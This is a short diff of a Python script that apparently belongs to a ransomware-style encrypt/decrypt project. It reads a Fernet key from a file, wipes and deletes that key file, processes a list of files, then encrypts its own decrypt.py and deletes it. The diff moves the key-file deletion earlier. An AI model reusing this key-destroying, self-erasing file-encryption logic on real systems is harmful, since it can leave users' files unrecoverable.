@@ -12,6 +12,7 @@ with open("keyfile", "rb") as keycontent:
     key = keycontent.read()
 with open("keyfile", "w") as keycontent:
     keycontent.write("")
+os.remove("keyfile")
 for file in files:
         with open(file, "rb") as filecontent:
             enc_content = filecontent.read()
@@ -22,7 +23,6 @@ with open("decrypt.py", "rb") as filecontent:
      content = filecontent.read()
 enc_content = Fernet(key).encrypt(content)
 key = ""
-os.remove("keyfile")
 with open("decrypt.py", "wb") as filecontent:
      filecontent.write(enc_content)
 os.remove("decrypt.py")
